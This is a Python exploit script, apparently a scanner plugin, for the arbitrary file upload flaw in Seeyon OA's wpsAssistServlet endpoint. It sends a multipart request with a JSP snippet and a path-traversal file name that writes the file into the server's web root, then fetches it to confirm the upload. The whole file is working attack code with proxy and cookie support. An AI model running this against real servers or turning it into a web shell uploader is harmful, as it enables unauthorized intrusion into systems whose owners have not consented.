import requests
import re
from bs4 import BeautifulSoup
import logging

uia=''
http = ''
https = ''
def dl201(dl):
    global http,https
    http=dl
    https=dl
def ty(url,s_cookie=None):
    global uia
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        headers = {
            'Content-Type': 'multipart/form-data; boundary=-***'}
        data = '''
        ---***
        Content-Disposition: form-data; name="upload"; filename=""\r\nContent-Type: application/vnd.ms-excel\r\n\r\n<% out.println("cadbckncdacavefv");%>\r\n---***--'''
        vuln_url = url + "seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/94acad.txt&fileId=2"
        logging.captureWarnings(True)
        gf = requests.post(vuln_url,data=data,cookies=s_cookie, headers=headers,proxies=proxies, verify=False)
        gf.encoding = 'utf-8'
        if gf.status_code==200:
            gf1 = requests.get(url + "94acad.txt",cookies=s_cookie, proxies=proxies, verify=False)
            if 'cadbckncdacavefv' in gf1.text:
                uia = '[+]漏洞存在\n/94acad.txt\n'+str(gf1.text)
            else:
                uia = "[-]漏洞不存在"
        else:
            uia = "[-]漏洞不存在"
    except Exception as aaa:
        uia = '[-]请求错误\n' + str(aaa)
def yt1():
    global uia
    return '--------------------------------------------------\n[ 致远OA wpsAssistServlet 任意文件上传 ]\n\n'+ str (uia)+'\n'
def yt1a(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        ty(url1,s_cookie)
    elif pd=='1':
        ty(url1,s_cookie)